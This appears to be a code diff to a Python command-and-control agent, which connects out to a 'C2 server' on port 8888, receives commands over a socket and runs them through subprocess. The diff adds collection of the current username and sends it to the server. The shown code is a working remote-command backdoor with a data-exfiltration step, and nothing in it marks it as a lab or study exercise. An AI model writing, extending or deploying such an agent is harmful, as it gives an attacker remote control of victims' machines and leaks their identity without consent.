@@ -1,5 +1,6 @@
 import socket
 import subprocess
+import getpass  # Module to get the username
 
 def execute_command(command):
     try:
@@ -13,9 +14,11 @@ def main():
     port = 8888  # Port the C2 server is listening on
 
     try:
+        username = getpass.getuser()  # Get the current username
         agent_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         agent_socket.connect((host, port))
-        print("\nConnected to C2 server")
+        print("\nConnected to C2 server as:", username)  # Print the username
+        agent_socket.send(username.encode())  # Send the username to the server
 
         while True:
             command = agent_socket.recv(4096).decode().strip()
